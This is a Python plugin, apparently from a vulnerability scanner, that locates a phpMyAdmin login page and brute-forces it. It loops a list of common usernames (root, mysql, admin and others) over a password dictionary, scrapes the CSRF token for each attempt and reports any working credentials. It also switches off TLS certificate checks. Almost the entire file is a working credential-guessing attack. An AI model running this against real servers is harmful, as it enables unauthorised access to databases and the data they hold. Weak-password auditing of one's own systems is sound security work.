__author__ = '10192989'
# coding=utf-8

import urllib.request, urllib.error, urllib.parse
import re
import random
from exp.lib.gla import getpassdict
from exp.lib.httpparse import httpparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context


def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    flag_list = [b'src="navigation.php', b'frameborder="0" id="frame_content"', b'id="li_server_type">',
                 b'class="disableAjax" title=']
    user_list = ['root', 'mysql', 'wwwroot', 'admin', 'zte']
    error_i = 0
    print('testing if phpmyadmin weak pass vul')
    http = httpparse()
    try:
        path = '/'
        tm = http.httpreq('GET', protocol, ip, port,path)
        if b'input_password' in tm[2] and b'name="token"' in tm[2]:
            url = 'http://' + ip + ":" + str(port) + "/index.php"
        else:
            path = path+"phpmyadmin/"
            newtm = http.httpreq('GET', protocol, ip, port,path)
            if b'input_password' in newtm[2] and b'name="token"' in newtm[2]:
                url = 'http://' + ip + ":" + str(port) + "/phpmyadmin/index.php"
            else:
                msg = 'It is not phpmyadmin server on url:' +url+'.'
                number = 'v0'
                return False,url,number,msg
    except Exception as e:
        pass

    passdictarr = getpassdict()
    psw = passdictarr.get_pass_dict()
    #psw = random.sample(psw, 4)
    for user in user_list:
        for pass_ in psw:
            try:
                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
                res_html = opener.open(url, timeout=10).read()
                res_html = res_html.decode()
                token = re.search('name="token" value="(.*?)" />', res_html)
                token_hash = urllib.parse.quote(token.group(1))
                postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
                user, pass_, token_hash)
                postdata = postdata.encode(encoding="utf-8")
                res = opener.open(url,postdata, timeout=5)
                res_html = res.read()
                for flag in flag_list:
                    if flag in res_html:
                        msg = 'There is phpmyadmin weak pass vul on: %s , with username: %s and password: %s.' %(url,user,pass_)
                        print(msg)
                        number = 'v74'
                        return True,url,number,msg
                    else:
                        pass
            except urllib.error.URLError as e:
                msg = str(e)
                error_i += 1
                if error_i >= 3:
                    msg = 'There is no phpmyadmin server on url:' +url+'.'
                    number = 'v0'
                    return False,url,number,msg
            except Exception as e:
                msg = str(e)
    msg = 'Therer is no phpmyadmin weakpass vul in url:' +url+'.'
    number = 'v0'
    return False,url,number,msg


